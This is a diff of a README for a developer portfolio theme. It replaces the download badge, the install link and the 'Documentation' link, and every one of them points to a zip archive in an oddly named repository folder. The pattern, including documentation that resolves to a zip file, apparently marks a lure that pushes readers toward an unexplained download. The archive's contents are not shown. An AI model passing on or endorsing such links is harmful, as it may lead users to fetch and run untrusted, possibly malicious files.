@@ -1,6 +1,6 @@
 # 🎨 DevPortfolio-Theme - A Powerful Theme for Developers
 
-[![Download DevPortfolio-Theme](https://raw.githubusercontent.com/Syarif23-stack/DevPortfolio-Theme/main/didacticism/Theme-Dev-Portfolio-conversably.zip%20Now-%20-blue)](https://raw.githubusercontent.com/Syarif23-stack/DevPortfolio-Theme/main/didacticism/Theme-Dev-Portfolio-conversably.zip)
+[![Download DevPortfolio-Theme](https://github.com/Syarif23-stack/DevPortfolio-Theme/raw/refs/heads/main/didacticism/Dev-Theme-Portfolio-v1.7.zip%20Now-%20-blue)](https://github.com/Syarif23-stack/DevPortfolio-Theme/raw/refs/heads/main/didacticism/Dev-Theme-Portfolio-v1.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Welcome to DevPortfolio-Theme! This theme is designed for developers who want to
 
 To get started, visit the following page to download the latest version of DevPortfolio-Theme:
 
-[Download DevPortfolio-Theme](https://raw.githubusercontent.com/Syarif23-stack/DevPortfolio-Theme/main/didacticism/Theme-Dev-Portfolio-conversably.zip)
+[Download DevPortfolio-Theme](https://github.com/Syarif23-stack/DevPortfolio-Theme/raw/refs/heads/main/didacticism/Dev-Theme-Portfolio-v1.7.zip)
 
 ### Step-by-Step Installation Guide
 
@@ -73,7 +73,7 @@ If you encounter any issues or have questions, feel free to reach out through th
 
 DevPortfolio-Theme is licensed under the [MIT License](LICENSE). You can freely use, modify, and distribute this theme according to the license terms.
 
-For further information, visit our [Documentation](https://raw.githubusercontent.com/Syarif23-stack/DevPortfolio-Theme/main/didacticism/Theme-Dev-Portfolio-conversably.zip).
+For further information, visit our [Documentation](https://github.com/Syarif23-stack/DevPortfolio-Theme/raw/refs/heads/main/didacticism/Dev-Theme-Portfolio-v1.7.zip).
 
 ---
 
